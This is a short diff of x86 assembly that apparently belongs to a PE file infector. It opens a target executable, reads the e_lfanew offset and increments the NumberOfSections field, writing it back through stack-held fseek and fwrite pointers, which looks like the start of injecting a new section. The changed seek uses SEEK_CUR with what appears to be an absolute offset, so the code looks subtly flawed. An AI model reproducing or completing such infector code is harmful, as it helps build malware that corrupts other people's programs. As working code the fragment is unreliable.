@@ -213,12 +213,14 @@ start:
 		getval fromStack(tgHand), 4, SEEK_SET, 3Ch
 		toStack lfanew, vaccess(tempDword)
 
+		; Insert new NumberOfSections
 		mov ecx, fromStack(lfanew)
 		add ecx, 6
 		getval fromStack(tgHand), 2, SEEK_SET, ecx
 		toStack NumberOfSections, vaccess(tempDword)
 		inc vaccess(tempDword)
-		setval fromStack(tgHand), 2, SEEK_SET, ecx ; Insert new NumberOfSections
+		invoke fromStack(fseek), fromStack(tgHand), ecx, 0, SEEK_CUR
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 2, daccess(tempDword2), 0
 
 		add ecx, 20 - 6 ; = lfanew + 20
 		getval fromStack(tgHand), 2, SEEK_SET, ecx
